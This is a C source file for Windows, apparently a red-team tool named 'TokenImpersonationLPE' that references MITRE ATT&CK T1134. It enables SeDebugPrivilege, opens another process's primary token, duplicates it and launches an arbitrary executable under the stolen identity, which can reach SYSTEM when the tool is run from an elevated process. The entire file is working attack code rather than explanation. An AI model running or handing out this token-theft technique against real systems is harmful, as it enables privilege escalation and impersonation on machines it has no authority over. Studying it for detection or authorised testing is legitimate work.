// Author: Wizardy0ga
// 
// Impersonates a target processes primary access token and spawns
// a new process with the impersonated token. User must specify 
// target process pid and the process image to spawn.
//
// Related Mitre Info
// https://attack.mitre.org/techniques/T1134/001/
// https://attack.mitre.org/techniques/T1134/002/
// 
// General process to impersonate primary access token and create process with it
// 1. Get current token
// 2. Set current token privilege to SeDebugPrivilege
// 3. Get handle to target process pid
// 4. Get handle to target process primary token
// 5. Duplicate the token to assign additional access rights for process creation
// 6. create a process with the new token
// 
# include <windows.h>
# include <stdio.h>
# include <lmcons.h>

# define print( msg, ... ) wprintf(L"[+] " msg L"\n", ##__VA_ARGS__)
# define puts( msg, ... ) wprintf(L"[-] " msg L"\n", ##__VA_ARGS__)
# define apiputs( api ) wprintf(L"[-] " api L" failed with error: %d\n", GetLastError())

// Helper function to translate token to appropriate account name and domain. 
// Does not effect token impersonation function.
wchar_t* GetAccountNameFromToken( HANDLE hToken ) {
	DWORD		 TokenInfoLen	     = 0;
	PTOKEN_USER	 pTokenInfo		     = 0;
	SID_NAME_USE AccountType	     = 0;
	DWORD		 dwUserLen		     = UNLEN + 1;
	DWORD		 dwDomainLen		 = DNLEN + 1;
	wchar_t	     wcUser[UNLEN + 1]	 = { 0 }, 
				 wcDomain[DNLEN + 1] = { 0 };
	PWCHAR		 pFullname	         = 0;
	SIZE_T		 FullNamelen         = 0;

	GetTokenInformation( hToken, TokenUser, 0, 0, &TokenInfoLen );
	if ( ( pTokenInfo = (PTOKEN_USER)malloc( (SIZE_T)TokenInfoLen ) ) == NULL ) {
		apiputs(L"malloc");
		goto cleanup;
	}

	if ( !GetTokenInformation( hToken, TokenUser, pTokenInfo, TokenInfoLen, &TokenInfoLen ) ) {
		apiputs(L"GetTokenInformation");
		goto cleanup;
	}

	if ( !LookupAccountSidW( 0, pTokenInfo->User.Sid, wcUser, &dwUserLen, wcDomain, &dwDomainLen, &AccountType ) ) {
		apiputs(L"LookupAccountSidW");
		goto cleanup;
	}
	
	FullNamelen = (SIZE_T)( (dwUserLen + dwDomainLen) * sizeof(wchar_t) );
	if ( ( pFullname = (wchar_t*)malloc( FullNamelen ) ) == NULL ) {
		apiputs(L"malloc[2]");
		goto cleanup;
	}
	swprintf_s(pFullname, FullNamelen, L"%ls\\%ls", wcDomain, wcUser);

cleanup:
	if ( pTokenInfo )
		free(pTokenInfo);

	return pFullname;
}

int wmain( int argc, wchar_t* argv[] ) {

	HANDLE				hCurrentToken      = 0,
						hTargetProcess     = 0,
						hPrimaryToken	   = 0,
						hImpersonatedToken = 0; 
	LUID				LocalUniqueId	   = { 0 };
	LUID_AND_ATTRIBUTES LUIDAttrib	       = { 0 };
	TOKEN_PRIVILEGES	NewTokenPrivs	   = { 0 };
	DWORD				dwTargetPid        = 0;
	STARTUPINFO			Si				   = { 0 };
	PROCESS_INFORMATION Pi                 = { 0 };
	wchar_t				*current_user = 0, *target_user = 0;

	Si.cb = sizeof(STARTUPINFO);

	if ( argc != 3 ) {
		puts(L"USAGE: TokenImpersonationLPE <pid to impersonate> </path/to/exe>\nNOTE: Must be running within elevated process to impersonate SYSTEM tokens.");
		return -1;
	}

	if ( !( dwTargetPid = _wtoi( argv[1] ) ) ) {
		puts(L"An invalid data type was supplied for the process id.");
		return -1;
	}
	print( L"The id for this process is %d", GetCurrentProcessId() );

	// --- Step 1: Get the current running process token
	if ( !OpenProcessToken( (HANDLE)-1, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hCurrentToken ) ) {
		apiputs( L"OpenProcessToken" );
		return -1;
	}
	current_user = GetAccountNameFromToken( hCurrentToken );
	print(L"Acuired handle to current token as %s", current_user);

	// --- Step 2: Enable the SeDebugPrivilege permission of current running process token
	if ( !LookupPrivilegeValueW( 0, L"SeDebugPrivilege", &LocalUniqueId ) ) {
		apiputs( L"LookupPrivilegeValueW" );
		goto cleanup;
	}

	NewTokenPrivs.PrivilegeCount		   = 1;
	NewTokenPrivs.Privileges[0].Luid       = LocalUniqueId;
	NewTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if ( !AdjustTokenPrivileges( hCurrentToken, FALSE, &NewTokenPrivs, 0, 0, 0 ) ) {
		apiputs( L"AdjustTokenPrivileges" );
		goto cleanup;
	}
	print( L"Granted SeDebugPrivilege to current token" );

	// --- Step 3: Get a handle to the target process 
	if ( !( hTargetProcess = OpenProcess( PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwTargetPid ) ) ) {
		apiputs(L"OpenProcess");
		goto cleanup;
	}
	print(L"Got handle to pid: %d", dwTargetPid);

	// --- Step 4: Get a handle to the target processes primary token
	if ( !OpenProcessToken( hTargetProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hPrimaryToken ) ) {
		apiputs(L"OpenProcessToken");
		goto cleanup;
	}
	target_user = GetAccountNameFromToken( hPrimaryToken );
	print( L"Got handle to pid %d primary token as %ls", dwTargetPid, target_user );

	// --- Step 5: Duplicate the token to assign additional access rights for process creation
	if ( !DuplicateTokenEx( hPrimaryToken, MAXIMUM_ALLOWED, 0, SecurityImpersonation, TokenImpersonation, &hImpersonatedToken ) ) {
		apiputs( L"DuplicateToken" );
		goto cleanup;
	}
	print( L"Impersonated primary token with maximum available permissions" );

	// --- Step 6: Create process with impersonated token
	if ( !CreateProcessWithTokenW(hImpersonatedToken, LOGON_WITH_PROFILE, argv[2], 0, 0, 0, 0, &Si, &Pi)) {
		apiputs(L"CreateProcessWithTokenW");
		goto cleanup;
	}
	print( L"Spawned new %s process (%d)", argv[2], Pi.dwProcessId );

cleanup:
	if ( hCurrentToken )
		CloseHandle( hCurrentToken );

	if ( hTargetProcess )
		CloseHandle( hTargetProcess );

	if ( hPrimaryToken )
		CloseHandle( hPrimaryToken );

	if ( hImpersonatedToken )
		CloseHandle( hImpersonatedToken );

	if ( target_user )
		free( ( void* )target_user );

	if ( current_user )
		free( ( void* )current_user );

	getchar();
	print("Cleanly finished");
	return 0;
}